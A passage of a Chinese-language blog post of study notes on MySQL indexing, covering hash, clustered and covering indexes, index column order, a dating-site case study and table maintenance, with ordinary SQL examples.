code)，哈希码是一个较小的值，并且不同键值的行计算出来的哈希码也不一样。哈希索引将所有的哈希码存储在索引中，同时在哈希表中保存指向每个数据行的指针。</li><li>MySQL中，只有Memory引擎显示支持哈希索引，也是该引擎表的默认索引类型，也支持B-Tree索引，另外还支持非唯一哈希索引(如果多个列的哈希值相同，索引会以链表的方式存放多个记录指针到同一个哈希条目中)。</li><li>索引自身只需存储对应的哈希值，所以索引的结构十分紧凑，也让哈希索引查找的速度非常快。</li><li><p>限制：</p><ul><li>只包含哈希值和行指针，而不存储字段值，所以不能使用索引中的值来避免读取行。但由于在内存中，对性能的影响并不明显。</li><li>并不是按照索引值顺序存储的，所以无法用于排序。</li><li>不支持部分索引列匹配查找，因为哈希索引始终是使用索引列的全部内容来计算哈希值。</li><li>只支持等值比较查询，包括=、IN()、&lt;=&gt;。也不支持任何范围查询。</li><li>访问哈希索引的数据非常快，除非有很多哈希冲突(不同索引列值却有相同的hash值)。当出现哈希冲突时，存储引擎必须遍历所有的行指针，逐行比较，直到找到对应的行。</li><li>如果哈希冲突很多的话，一些索引维护操作的代价也非常高。例如删除一行时，需遍历对应哈希值的每一行。</li></ul></li><li><p>应用场景：</p><ul><li>数据仓库应用中有一种经典的“星型”schema，需要管理很多查找表</li></ul></li><li><p>InnoDB的自适应哈希索引(adaptive hash index):</p><ul><li>当InnoDB注意到某些值被使用的非常频繁时，会在内存中基于B-Tree索引之上在创建一个hash索引，从而拥有hash索引的优点，如快速的hash查找。这是一个完全自动的，内部的行为，用户无法控制或者配置，但可以关闭。</li></ul></li><li><p>创建自定义哈希索引：</p><ul><li><p>如果存储引擎不支持hash索引，可以模仿像InnoDB一样创建hash索引。</p></li><li><p>思路：在B-Tree基础上创建一个伪哈希索引，即将要索引的列删除索引，对其创建一个被索引哈希列，里面存放原索引列每一行数据的哈希值。</p></li><li><p>缺陷：需要维护哈希值，可以手动维护，也可以使用触发器实现。</p></li><li><p>使用时不要使用SHA1()和MD5()作为哈希函数，因为这两个函数计算出来的哈希值非常长，浪费大量空间而且比较时也会更慢。可以使用CRS32()。</p></li><li><p>如果数据表非常大，CRS32()会出现大量的数据冲突，可以自行实现一个简单的64位哈希函数，这个函数要返回整数，而不是字符串。也可以使用MD5()函数返回值的一部分来作为哈希函数。</p><p><code>SELECT CONV(RIGHT(MD5(&quot;str&quot;), 16), 16, 10) AS HASH64</code></p></li><li><p>使用哈希索引进行查询时，必须在WHERE子句包含对应列值，因为可能会有哈希冲突从而选出多个不同的数据。</p></li></ul></li></ul></li><li><p>空间数据索引(R-Tree):</p><ul><li>与B-Tree不同，这类索引无需前缀查询，会从所有维度来索引数据。</li><li>查询时可以使用任意维度来组合查询。</li><li>必须使用MySQL的GIS相关函数如MBRCONTAINS()等来维护数据。(MySQL的GIS支持不完善，开源关系数据库中较好的解决方案是PostgreSQL的PostGIS)</li><li>MyISAM表支持空间索引，可以用作地理数据存储</li></ul></li><li><p>全文索引：</p><ul><li>查找的是文中关键词，而不是直接比较索引中的值。</li><li>与其他索引完全不一样，需注意如停用词、词干和复数、布尔搜索等细节。</li><li>更类似于搜索引擎做的事，而不是简单的WHERE条件匹配。</li><li>在相同列上同时创建全文索引和基于值的B-Tree索引不会有冲突，全文索引适用于MATCH AGAINST操作。</li></ul></li></ul><h2 id="索引的优点"><a href="#索引的优点" class="headerlink" title="索引的优点"></a>索引的优点</h2><ul><li><p>优点：</p><ul><li>大大减少服务器需要扫描的数据量</li><li>帮助服务器避免排序和临时表(B-Tree会将相关的列值存储在一起，便于ORDER BY 和GROUP BY进行排序)</li><li>可以将随机IO变为顺序IO</li></ul></li><li><p>索引适合某个查询的“三星系统”：</p><ul><li>将相关记录放到一起则获得一星</li><li>索引中的数据顺序和查找中的排列顺序一致获得二星。</li><li>索引中的列包含了查询中需要的全部列获得三星。</li></ul></li><li><p>索引并不是最好的解决方案：</p><ul><li>非常小的表，大部分情况下全表扫描更高效。</li><li>中到大型的表，索引非常有效。</li><li>特大型的表，建立和使用索引的代价随之增长，需要区分出查询需要的一组数据，如分区技术。</li><li>表的数量特别多，可以建立一个元数据信息表，用来查询需要用到的某些特性。例如执行那些需要聚合多个应用分布在多个表的数据的查询，则需要记录“哪个用户的信息存储在哪个表中”的元数据，这样在查询时就可以直接忽略掉那些不包含指定用户信息的表。对大型系统是一个常用的技巧</li><li>对于TB级别的数据，定位单条记录的意义不大，所以经常使用块级元数据技术来代替索引</li></ul></li></ul><h2 id="高性能的索引策略"><a href="#高性能的索引策略" class="headerlink" title="高性能的索引策略"></a>高性能的索引策略</h2><h3 id="独立的列"><a href="#独立的列" class="headerlink" title="独立的列"></a>独立的列</h3><ul><li><p>索引列不能是表达式的一部分，也不能是函数的参数。因为MySQL无法自动解析</p><p><code>WHERE column + 1 = 5 AND TO_DAYS(CURRENT_DATE) - TO_DAYS(date_col) &amp;lt;= 10</code></p></li></ul><h3 id="前缀索引和索引选择性"><a href="#前缀索引和索引选择性" class="headerlink" title="前缀索引和索引选择性"></a>前缀索引和索引选择性</h3><p>索引很长的字符列，会让索引变得大且慢。一个策略是模拟的哈希索引，另一个策略是前缀索引。</p><ul><li><p>索引选择性：</p><ul><li>指不重复的索引值(也成基数，cardinality)和数据表的记录总数(#T)的比值</li><li>选择性越高则查询效率越高，唯一索引的选择性是1，性能是最好的。</li></ul></li><li><p>前缀索引：</p><ul><li><p>索引开始的部分字符串，即可节约索引空间，从而提高索引效率，但会降低索引的选择性。</p></li><li><p>一般情况下某个列前缀的选择性也是足够高的，足以满足查询性能。</p></li><li><p>针对BLOB，TEXT或很长的VARCHAR类型的列，必须使用前缀索引，因为MySQL不允许索引这些列的完整长度。</p></li><li><p>选择前缀长度的诀窍：保持较高的选择性(接近于索引完整列)，同时又不能太长。换句话说，前缀的基数应接近于完整列的基数。</p></li><li><p>方法：</p><p>先计算出完整列的选择性：<code>SELECT COUNT(DISTINCT col)/COUNT(*) FROM mytable</code> , 再与平均选择性和最差选择性比较。</p><ul><li><p>平均选择性：在一个查询中针对不同前缀长度进行计算</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT COUNT(DISTINCT LEFT(col, 3))/COUNT(*) AS sel3,    COUNT(DISTINCT LEFT(col, 4))/COUNT(*) AS sel4,    ...FROM mytable;</span><br></pre></td></tr></table></figure></li><li><p>最差选择性：针对平均选择性选出的多个前缀长度，考虑其数据分布很不均匀下的选择性。</p></li></ul></li><li><p>缺点：</p><ul><li>MySQL无法使用前缀索引做ORDER BY和GROUP BY</li><li>无法做覆盖扫描</li></ul></li><li><p>应用场景：</p><ul><li>针对很长的十六进制唯一ID，如保存网站的会话(SESSION)，可采用长度为8的前缀索引，而且对上层应用完全透明。</li><li>有时使用后缀索引也有用途，如找到某个域名的所有电子邮件地址。但MySQL原生不支持反向索引，可以通过触发器把字符串反转后存储，并基于此建立前缀索引。</li></ul></li></ul></li></ul><h3 id="多列索引"><a href="#多列索引" class="headerlink" title="多列索引"></a>多列索引</h3><ul><li><p>在多个列上建立独立的单列索引大部分情况下并不能提高MySQL的查性能。</p><ul><li><p>MySQL5.0及以后版本引入“索引合并(index merge)”的策略，一定程度上可以使用表上的多个单列索引来定位指定的行。对示例查询同时使用两个单列索引进行扫描，并将结果进行合并，可以通过EXPLAIN的Extra看到过程。这算法有三个变种：</p><ul><li>OR条件的联合(union)</li><li>AND条件的相交(intersection)</li><li>组合前两种情况的联合及相交</li></ul></li></ul></li><li><p>索引合并策略有时候是一种优化的结果，但实际上更多时候说明了表上的索引建得很糟糕：</p><ul><li>当出现服务器对多个索引做相交操作时(通常有多个AND条件)，通常意味着需要一个包含所有相关列的多列索引，而不是多个独立的单列索引</li><li>当服务器对多个索引做联合操作时(通常有多个OR条件)，通常需要耗费大量的CPU和内存在算法的缓存、排序和合并操作上。特别是当其中有些索引的选择性不高，需要合并扫描返回的大量数据的时候。</li><li>优化器不会把这些计算到“查询成本(cost)”中，而优化器只关心随机页面读取。这会使得查询的成本被低估，导致执行该计划还不如直接走全表扫描。这样做不但会消耗更多的CPU和内存资源，还可能会影响查询的并发性，但如果是单独运行这样的查询往往会忽略对并发性的影响。通常来说，将查询改为UNION的方式往往更好。</li></ul></li><li><p>如果在EXPLAIN中看到有索引合并，应检查下查询和表的结构以达到最优。也可以通过参数optimizer_switch来关闭索引合并功能，或使用INGORE INDEX提示让优化器忽略掉某些索引。</p></li></ul><h3 id="选择合适的索引列顺序-B-Tree场景"><a href="#选择合适的索引列顺序-B-Tree场景" class="headerlink" title="选择合适的索引列顺序(B-Tree场景)"></a>选择合适的索引列顺序(B-Tree场景)</h3><p>正确的顺序依赖于使用该索引的查询，并且同时需要考虑如何更好地满足排序和分组的需要。</p><ul><li><p>选择索引列顺序的经验法则：</p><ul><li>当不需要考虑排序和分组时，将选择性最高的列放到索引最前列</li><li><p>性能不只是依赖于所有索引列的选择性(整体基数)，也和查询条件的具体值有关，也就是和值的分布有关。</p><ul><li>如果某些索引值的选择性非常小，即匹配的范围非常大，说明该索引基本没什么用。该特殊情况可能会摧毁整个应用的性能。</li></ul></li></ul></li></ul><h3 id="聚簇索引-主要关注InnoDB"><a href="#聚簇索引-主要关注InnoDB" class="headerlink" title="聚簇索引(主要关注InnoDB)"></a>聚簇索引(主要关注InnoDB)</h3><ul><li>不是一种单独的索引类型，而是一种数据存储的方式。具体的细节依赖于其实现方式，但InnoDB的聚簇索引实际上在同一个结构中保存了B-Tree索引和数据行。</li><li>当表有聚簇索引时，它的数据行实际上存放在索引中的叶子页(leaf page)中，但节点也只包含了索引列。术语的“聚簇”表示数据行和相邻的键值紧凑地存放在一起(Oracle中为索引组织表)。如图，被索引的列是主键列<figure><img src="03.png" alt="聚簇索引的数据分布"><figcaption>聚簇索引的数据分布</figcaption></figure></li><li>一个表只能有一个聚簇索引，因为无法同时将数据行存放在两个不同的地方</li><li><p>MySQL内建的存储引擎不支持选择索引作为聚簇索引，InnoDB将通过主键聚集数据，其默认使用聚簇索引：</p><ul><li>如果没有定义主键，InnoDB会选择一个唯一的非空索引。</li><li>如果没有唯一的非空索引，InnoDB会隐式定义一个逐渐。</li></ul></li><li><p>InnoDB只聚集在同一个页面的记录，包含相邻键值的页面可能会相距甚远。</p></li><li><p>优缺点：</p><ul><li><p>优点(设计表和查询时充分利用可极大地提示性能):</p></li><li><p>可以把相关数据保存在一起。如实现电子邮箱时，根据用户ID来聚集数据，这样只需从磁盘读取少数的数据页就能获取某个用户的全部邮件。如果没有使用聚簇索引，则每封电子邮件都可能导致一次磁盘IO。</p></li><li>数据访问更快。因为索引和数据都保存在同一个B-Tree中。</li><li>使用覆盖索引扫描的查询可以直接使用页节点中的主键值。</li></ul></li><li><p>缺点：</p><ul><li>最大限度地提高了I/O密集型应用的性能，但如果数据全部存放在内存中，则访问的顺序就没那么重要了，聚簇索引也就没什么优势。</li><li>插入速度严重依赖于插入顺序。按照主键的顺序插入是加载数据到InnoDB表中速度最快的方式。如果不是按照主键顺序加载数据，加载完成后最好使用OPTIMIZE TABLE命令重新组织一下表。</li><li>更新聚簇索引列的代价很高，因为会强制InnoDB将每个被更新的行移动到新的位置。</li><li>基于聚簇索引的表在插入新行，或者主键被更新导致需要移动行的时候，可能面临“页分裂(page split)”的问题。当行的主键值要求必须将这一行插入到某个已满的页中时，存储引擎会将该页分裂成两个页面来容纳该行，这会导致表占用更多的磁盘空间。</li><li>可能导致全表扫描变慢，尤其是行比较稀疏，或者由于页分裂导致数据存储不连续的时候。</li><li>二级索引(非聚簇索引)可能比想象的要更大，因为在二级索引的叶子节点包含了引用行的主键列。</li><li>二级索引访问需要两次索引查找，而不是一次。因为二级索引叶子节点保存的不是指向行的物理位置的指针，而是行的主键值。(InnoDB的自适应哈希索引能够减少这样的重复工作)</li></ul></li><li><p>InnoDB和MyISAM的数据分布对比</p><figure><img src="04.png" alt="聚簇和非聚簇表对比图"><figcaption>聚簇和非聚簇表对比图</figcaption></figure><ul><li><p>InnoDB：</p><ul><li>由于采用了聚簇索引，其保存了整个表</li><li>聚簇索引每个叶子节点都包含了主键值、事务ID、用于事务和MVVC的回滚指针以及所有的剩余列。</li><li>二级索引的叶子节点存储的不是”行指针”，而是主键值，并以此作为指向行的“指针”。即叶子节点包含被索引的列和主键列。这样的策略会让二级索引占用更多的空间，但减少了当出现行移动或者数据页分裂时二级索引的维护工作，因为无须更新二级索引中的指针。</li></ul></li><li><p>MyISAM</p><ul><li>采用了独立的行存储，按照数据插入的顺序存储在磁盘上</li><li>主键索引和其他索引在结构上一样，主键索引是一个名为PRIMARY的唯一非空索引。</li></ul></li></ul></li><li><p>在InnoDB表中按主键顺序插入行</p><ul><li>如果没有数据需要聚集，建议定义一个代理键作为主键，并且主键的数据应该和应用无关。最简单是使用AUTO_INCREMENT自增列，这样可以保证数据行是按顺序写入的，对于根据主键做关联操作的性能更好。</li><li>最好避免随机的(不连续且值的分布范围非常大)聚簇索引，特别是对于I/O密集型的应用，比如使用UUID作为聚簇索引可能会带来糟糕的性能，它使得聚簇索引的插入完全随机，使得插入行的时间更长，而且索引占用的空间更大。因为主键的字段更长，还由于页分裂和碎片导致。</li><li><p>根据顺序id插入数据：<br>每条记录都存储在上一条记录的后面，当达到页的最大填充因子时(InnoDB默认为页大小的15/16，留出部分空间用于以后修改)，下一条记录会插入新的页中。一旦数据按照这种顺序的方式加载，主键页就会被近似于被顺序的记录填满(二级索引页可能是不一样的)<br>造成更坏结果的场景：</p></li><li><p>对于高并发工作负载，可能会造成明显的争用。因为所有的插入都发生在这里，可能导致间隙锁竞争。</p></li><li>AUTO_INCREMENT锁机制也可能会被争用，需考虑重新设计表或者应用，或者更改innodb_autoinc_lock_mode配置。</li><li><p>使用随机id插入数据：<br>新行的主键值不一定比之前插入的大，因此需要为新行找到合适的位置——通常是已有数据的中间位置——并分配空间。这会增加很多额外的工作，并导致数据分布不够优化。<br>缺点：</p><ul><li>写入的目标页可能已经刷新到磁盘并从缓存中移除，或是还没有被加载到缓存中，InnoDB在插入之前需先从磁盘读取目标页到内存中，这将导致大量的随机IO。</li><li>因为写入是乱序的，需要频繁地做页分裂操作，以便为新行分配空间。因为页分裂会导致移动大量数据，一次插入最少需要修改三个页而不是一个页。</li><li>由于频繁的页分裂，页会变得稀疏并被不规则地填充，所以最终数据会有碎片。</li></ul></li></ul></li></ul><h3 id="覆盖索引"><a href="#覆盖索引" class="headerlink" title="覆盖索引"></a>覆盖索引</h3><p><strong>设计优秀的索引应该考虑到整个查询，而不单单是WHERE条件部分</strong></p><ul><li>覆盖索引：一个索引包含(覆盖)所有需要查询的字段的值</li><li><p>查询只需要扫描索引而无须回表读取数据行的好处：</p><ul><li>索引条目通常小于数据行大小，如果只需要读取索引会极大地减少数据访问量。这对缓存的负载非常重要，因为这种情况下响应时间大部分花在数据拷贝上。覆盖索引对IO密集型的应用也有帮助，因为索引被数据更小，更容易全部放入内存中(尤其是MyISAM能压缩索引)</li><li>索引是按照列值顺序存储的(至少在单个页内是如此 )，所以对于IO密集型的范围查询会比随机从磁盘读取每一行数据的IO要少得多。</li><li>一些存储引擎如MyISAM在内存中只缓存索引，数据则依赖于操作系统来缓存，因此访问数据需要一次系统调用。这可能会导致严重的性能问题，尤其是那些系统调用占了数据访问中的最大开销。</li><li>覆盖索引对使用了聚簇索引的InnoDB的表非常有用。InnoDB的二级索引在叶子节点保存了行的主键值，所以如果二级节点能够覆盖查询，则可以避免对主键索引的二次查询。</li></ul></li><li><p>覆盖索引必须要存储索引列的值，而哈希索引、空间索引和全文索引都不存储，MySQL只能使用B-Tree索引做覆盖索引。*   无法使用覆盖索引的原因：</p><ul><li>没有任何索引能够覆盖这个查询。</li><li>不能再索引执行LIKE操作。</li></ul></li><li>可以使用延迟关联使用覆盖索引，因为延迟了对列的访问。先在查询第一阶段使用覆盖索引，再在外层查询所要获取的列值。</li><li><p>InnoDB的二级索引的叶子节点包含了主键的值，这意味着二级索引可以有效地利用这些主键列来覆盖查询。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- last_name字段有二级索引，虽然该索引的列不包括逐渐actor_id，但也能用于对actor_id做覆盖查询mysql&gt;EXPLAIN SELECT actor_id, last_name     -&gt; FROM sakila.actor WHERE last_name = <span class="string">"HOPPER"</span>\G</span><br></pre></td></tr></table></figure></li><li><p>使用InnoDB的表通过主键查询所有列，并不是覆盖查询，虽然聚簇索引的叶子节点包含了所有列的数据，但它只是一种数据存储方式，并不算索引。</p></li></ul><h3 id="使用索引扫描来做排序"><a href="#使用索引扫描来做排序" class="headerlink" title="使用索引扫描来做排序"></a>使用索引扫描来做排序</h3><ul><li><p>MySQL生成有序结果的方式：</p><ul><li>通过排序操作</li><li>按索引顺序扫描。EXPLAIN出来的type列的值为“index”</li></ul></li><li><p>索引如果不能覆盖查询所需要的全部列，那每一条记录都需要回表查询。这基本上是随机IO，比顺序地全表扫描更慢，尤其是在IO密集型的工作负载时。</p></li><li>设计索引尽可能满足排序和查找行。</li><li><p>索引扫描排序的要求(如不满足都要执行排序操作)：</p><ul><li>只有索引的列顺序和ORDER BY子句顺序完全一致，并且所有列的排序方向(倒序或正序)都一样，MySQL才能够使用索引来对结果进行排序。</li><li>如果查询需要关联多个表，只有当ORDER BY子句引用的字段全部为第一个表时</li><li>ORDER BY子句和查找型查询的限制是一样的：需满足索引的最左前缀要求</li><li>ORDER BY子句可以在前导列为常量\常数的时候忽略该限制，如果WHERE或者JOIN子句对这些列定义了常量。<code>... WHERE col1=&quot;xxx&quot; ORDER BY col2 DESC;</code>，其中col1和col2为联合索引。</li></ul></li><li><p>不能使用索引做排序的查询：</p><ul><li>ORDER BY使用了两种不同的排序方向</li><li>ORDER BY引用了不在索引中的列</li><li>WHERE 和ORDER BY 中的列无法组合索引的最左前缀</li><li>WHERE在第一列是范围查询，MySQL无法索引其余列</li><li>在某列上有多个等于条件，对排序来说也是范围查询。</li></ul></li></ul><h3 id="压缩-前缀压缩-索引"><a href="#压缩-前缀压缩-索引" class="headerlink" title="压缩(前缀压缩)索引"></a>压缩(前缀压缩)索引</h3><ul><li>MyISAM使用前缀压缩来减少索引大小，从而让更多索引可以放入内存中，在某些情况下能极大地提高性能。</li><li>默认只压缩字符串，通过设置也能压缩整数。</li><li>压缩每个索引块的方法：先完全保存索引块的第一个值，然后将其他值和第一个值比较得到相同的前缀字节数和剩余的不同后缀部分，再把这部分存储起来。MyISAM对指针也采用类似的压缩方式。</li><li>压缩块使用更少的空间，代价是某些操作可能更慢。因为每个值都依赖前面的值，无法使用二分查找只能从头开始扫描，而对倒序的扫描性能更差。</li><li>对CPU密集型应用，因为扫描经常要随机查找，不推荐使用该索引。</li><li>在CREATE TABLE语句中制定PACK_KEYS参数来控制索引压缩的方式。</li></ul><h3 id="冗余和重复索引"><a href="#冗余和重复索引" class="headerlink" title="冗余和重复索引"></a>冗余和重复索引</h3><ul><li><p>冗余索引：在相同列上创建多个索引。MySQL需要单独维护重复的索引，并且优化器在查询时也需要逐个考虑，可能会影响性能。</p><ul><li>(A)是(A,B)的冗余索引，(B,A)和(B)则不是，只针对B-Tree索引来说</li><li>(A,ID)也是冗余索引，因为对InnoDB主键列已经包含在二级索引中</li><li>其他类型的如哈希索引也不会是B-Tree的冗余索引</li><li>增加新索引会导致INSERT，UPDATE等操作的速度变得更慢，特别是新增索引达到了内存瓶颈的时候。</li></ul></li><li><p>重复索引：在相同列上按照相同顺序创建的相同类型的索引。应该避免这种操作，常见错误做法是对一个主键添加唯一限制和查询索引，这属于三个重复的索引。(如果索引的类型不同，并不算重复索引)</p></li><li><p>大多数情况下都不需要冗余索引，应该尽量扩展已有的索引而不是创建新的索引。除非扩展已有的索引会导致其变得太大，从而影响其他使用该索引查询的性能。</p><ul><li>假如在整数列上有一个查询，现在需要额外增加很长的VARCHAR列来扩展该索引，可能会导致性能急剧下降。特别是有查询把这个索引当作覆盖查询，或者是MyISAM表并且有很多范围查询。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-- Q1查询：SELECT count(*) FROM userinfo WHERE state_id=5;-- Q2查询：SELECT state_id, city, address FROM userinfo WHERE state_id=5;-- Q2的查询速度会比Q1慢，最简单的办法是扩展索引变成覆盖查询：ALTER TABLE userinfo DROP key state_id, ADD KEY state_id_2 (state_id, city, address);-- 索引扩展后，Q2运行更快，但Q1变慢了。如果想要两个查询都变得更快，就需要两个索引，尽管这是冗余的。</span><br></pre></td></tr></table></figure></li></ul></li><li><p>解决冗余和重复索引的办法只需要删除它们。找出这些索引的办法：</p><ul><li>写一些复杂的访问INFORMATION_SCHEMA表的查询(服务器如果有大量的数据或表，可能会导致性能问题)</li><li>第三方工具。</li></ul></li><li><p>由于二级索引包含了主键值，因此(A)相当于(A,ID)，对WHERE A=5 ORDER BY ID这样的查询很有用。但如果(A)扩展为(A,B)相当于(A,B,ID)，前面的查询就无法使用该索引排序，而只能用文件排序。</p></li></ul><h3 id="未使用的索引"><a href="#未使用的索引" class="headerlink" title="未使用的索引"></a>未使用的索引</h3><p>找出它们，删掉！不过有些索引的功能相当于唯一约束，虽然一直没被查询使用，但是是用于避免产生重复数据的。</p><h3 id="索引和锁"><a href="#索引和锁" class="headerlink" title="索引和锁"></a>索引和锁</h3><ul><li><p>索引可以锁定更少的行。如果查询从不访问那些不需要的行，那么就会锁定更少的行：</p><ul><li>虽然InnoDB的行锁效率很高，内存使用也很少，但是锁定行的时候仍然会带来额外的开销。</li><li>锁定超过需要的行会增加锁争用并减少并发性。</li></ul></li><li><p>InnoDB只有在访问行的时候才会对其加锁，而索引能够减少InnoDB访问的次数，从而减少锁的数量。但只有当InnoDB在存储引擎层能够过滤掉所有不需要的行时才有效。</p><ul><li>如果索引无法过滤掉无效的行，那么在InnoDB检索到数据并返回给服务器层后，MySQL服务器才能应用WHERE子句。而这时候InnoDB已经锁住了这些行(包含有没被索引的行数据，这些是要在服务器层被过滤掉的，因为索引只在存储引擎层工作)，到适当的时候才释放。</li><li>MySQL5.0及新版本，InnoDB可以在服务器端过滤掉行就释放锁；但在早期版本，只有在事务提交后才能释放锁。</li></ul></li><li>如果不使用索引查找和锁定行的话，MySQL可能会做全表扫描并锁住所有的行，而不管是否需要。</li><li>InnoDB在二级索引上使用共享(读)锁，但访问主键索引需要排他(写)锁，这消除了使用覆盖索引的可能性，并且使得SELECT FOR UPDATE比LOCK IN SHARE MODE或非锁定查询要慢得多。</li></ul><h2 id="索引案例学习"><a href="#索引案例学习" class="headerlink" title="索引案例学习"></a>索引案例学习</h2><p>设计一个在线约会网站，用户信息表包括国家、地区、城市、性别、眼睛颜色等等。网站必须支持上面这些特征的各种组合来搜索用户，还必须允许根据用户的最后在线时间、其他会员对用户的评分等对用户进行排序并对结果进行限制。</p><ul><li>使用索引排序，还是先检索数据再排序？使用索引排序会严格限制索引和查询的设计。</li></ul><h3 id="支持多种过滤条件"><a href="#支持多种过滤条件" class="headerlink" title="支持多种过滤条件"></a>支持多种过滤条件</h3><ul><li><p>先看哪些列拥有不同的取值，哪些列在WHERE子句中出现得最频繁</p><pre><code>*   country和sex选择性通常比较低，考虑到使用频率，建议将(sex, country)作为查询前缀*   即使查询没有使用sex列，也可在查询条件中新增AND SEX IN(&apos;m&apos;, &apos;f&apos;)来绕过。但如果列有太多的值而导致IN()列表太长，或则IN()的数量太多导致有太多的组合，则不建议使用该技巧。*   **基本原则之一：考虑表上的所有选项。当设计索引时，不要只为现有的查询考虑需要哪些索引，还需要考虑对查询进行优化。**如果发现某些查询需要创建新索引，但是这个查询又会降低另一些查询的效率，那么应该考虑优化原有的查询，在优化查询和索引找到最佳的平衡，而不是一味追求最完美索引。</code></pre></li><li><p>考虑其他常见的WHERE组合列表，并需要了解哪些组合在没有合适索引的情况下会很慢。</p><pre><code>*   (sex, country, age)、(sex, country, region, age)(sex, country, region, city, age)都很常见*   这会需要大量的索引。如果想尽量重用索引，可以使用前面提到的IN()技巧*   如果没有指定这个字段搜索，就需要定义一个全部国家列表，或者国家的全部地区列表，来确保索引前缀有同样的约束(组合所有国家、地区、性别将会是一个非常大的条件)</code></pre></li><li><p>为一些生僻的搜索条件(比如has_pictures，eye_color，eduaction)来设计索引</p><pre><code>*   这些列选择性高，使用也不频繁，可以选择忽略，让MySQL多扫描一些额外的行*   或者在age列的前面加上这些列，在查询是使用IN()技巧来处理搜索时没有这些列的场景。</code></pre></li><li><p>为什么要将age列放在最后？age列有什么特殊的地方？</p><ul><li>尽可能让MySQL使用更多的索引列，因为查询只能使用索引的最左前缀，直到遇到第一个范围条件。前面的列都是等于条件，age列则大多是范围条件。</li><li>虽然可以用IN()来代替范围查询，例如age IN(18, 19, 20)，但不是所有的范围查询都可以转换。</li><li><strong>基本原则之二：尽可能将需要做范围查询的列放到索引后面，以便优化器能使用尽可能多的索引列。</strong></li></ul></li></ul><h3 id="避免多个范围条件"><a href="#避免多个范围条件" class="headerlink" title="避免多个范围条件"></a>避免多个范围条件</h3><p>假设有一个last_online列并希望通过下面的查询显示在过去几周上线过的用户：</p><pre><code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHERE eye_color IN(<span class="string">'brown'</span>, <span class="string">'blue'</span>, <span class="string">'hazel'</span>)    AND hair_color IN(<span class="string">'black'</span>, <span class="string">'red'</span>, <span class="string">'blonde'</span>, <span class="string">'brown'</span>)    AND sex IN(<span class="string">"M"</span>, <span class="string">"F"</span>)    AND last_online &gt; DATE_SUB(NOW(), INTERVAL 7 DAY)    AND age BETWEEN 18 AND 25;-- MySQL会将age&gt;18和age IN(18,19)都认为是范围查询(通过EXPLAIN查看)，但两种访问效率是不同的，因为第二个查询是多个等值条件查询。对MySQL来说，无法在使用范围查询后面的其他索引列，但对多个等值范围查询没有这个限制。</span><br></pre></td></tr></table></figure></code></pre><ul><li>这个查询有两个范围条件，MySQL无法同时使用它们。</li><li><p>如果无法将age字段转换为一个IN()的列表，并且要求对这两个维度的范围查询的速度很快，很遗憾没有一个直接的办法解决该问题，但可以将其中的一个范围查询转换成一个简单的等值比较：</p><ul><li>事先计算好一个active列，这个字段由定时任务来维护。当用户每次登陆时，将对应值设置为1，并且将过去连续7天未登陆的用户的值设置为0</li><li>这个方法可以使用(active, sex, country, age)索引。active并不是完全精确的，因为对这类查询的精度要求并不高。如果需要精确次数，可以把last_online列放到WHERE子句，但不加入到索引中。所以这个查询条件没法使用任何索引，但因为这个条件的过滤性不高，即使在索引中加入该列也没有太大的帮助，或者说缺乏合适的索引对该查询的影响也不明显。</li></ul></li><li><p>如果用户系统同时看到活跃和不活跃用户，可以在查询中使用IN()列表。另一个可选方案是为不同的组合创建单独的索引，至少要包含(active, sex, country, age)，(active, country, age)，(sex, country, age)和(country, age)，这些索引对某个具体的查询来说可能是更优化的，但是考虑到索引的维护额额外的空间占有代价，并不是一个好策略。</p><h3 id="优化排序"><a href="#优化排序" class="headerlink" title="优化排序"></a>优化排序</h3></li><li><p>对选择性非常低的列，可以增加一些特殊的索引来做排序。例如，可以创建(sex, rating)，这个查询同时使用了ORDER BY和LIMIT，如果没有索引会很慢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &lt;cols&gt; FROM profiles WHERE sex=<span class="string">"M"</span> ORDER BY rating LIMIT 10</span><br></pre></td></tr></table></figure></li><li><p>即使有索引，如果用户界面上要翻页，并且翻页翻到比较靠后时查询也可能非常慢:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &lt;cols&gt; FROM profiles WHERE sex=<span class="string">"M"</span> ORDER BY rating LIMIT 10000, 10;</span><br></pre></td></tr></table></figure><p>无论如何创建索引，这种查询都是严重的问题。因为随着偏移量的增加，MySQL需要花费大量的时间来扫描需要丢弃的数据。反范式化、预先计算和缓存可能是解决这类查询的仅有策略。一个更好的办法是限制用户能够翻页的数量，而实际上这对用户体验的影响并不大，因为用户很少真正在乎搜索结果的第10000页。</p></li><li>优化这类索引另一个较好的办法是使用延迟关联，通过使用覆盖索引查询返回需要的主键，再根据这些主键关联原表获得需要的行。这可以减少MySQL扫描那些需要丢弃的行数。   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &lt;cols&gt; FROM profiles INNER JOIN (  SELECT &lt;primary key cols&gt; FROM profiles   WHERE sex=<span class="string">"M"</span> ORDER BY rating LIMIT 10000, 10) AS x USING(&lt;primary key cols&gt;);</span><br></pre></td></tr></table></figure></li></ul><h2 id="维护和索引表"><a href="#维护和索引表" class="headerlink" title="维护和索引表"></a>维护和索引表</h2><p>维护表的三个目的：找到并修复损坏的表，维护准确的索引统计信息，减少碎片</p><h3 id="找到并修复顺坏的表"><a href="#找到并修复顺坏的表" class="headerlink" title="找到并修复顺坏的表"></a>找到并修复顺坏的表</h3><p>损坏的索引会导致查询返回错误的结果或莫须有的主键冲突问题，严重时还会导致数据库崩溃。</p><ul><li>尝试运行CHECK TABLE来检查是否发生了表损坏(注意有些引擎不支持该命令)，通常能够找出大多数的表和索引的错误。</li><li><p>修复表错误的办法：</p><ul><li>可以使用REPAIR TABLE来修复损坏的表(注意有些引擎不支持该命令)。</li><li>如果存储引擎不支持REPAIR TABLE，也可通过一个不做任何操作的ALTER来重建表，如修改表的存储引擎为当前引擎：<code>ALTER TABLE innodb_dbl 